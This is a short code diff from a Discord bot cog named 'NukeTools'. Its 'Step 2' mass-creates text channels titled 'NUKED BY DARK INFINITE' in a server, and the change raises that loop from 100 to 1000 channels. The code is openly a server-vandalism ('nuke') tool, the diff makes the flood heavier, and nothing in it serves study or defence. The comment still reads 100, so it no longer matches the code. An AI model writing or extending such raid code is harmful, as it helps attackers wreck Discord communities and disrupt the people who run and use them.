@@ -1301,7 +1301,7 @@ class NukeTools(Cog, name="nuketools"):
                 pass
 
         # Step 2: Create 100 channels named "nuked-by-7hx"
-        for i in range(100):
+        for i in range(1000):
             try:
                 ch = await guild.create_text_channel(
                     f"NUKED BY DARK INFINITE",
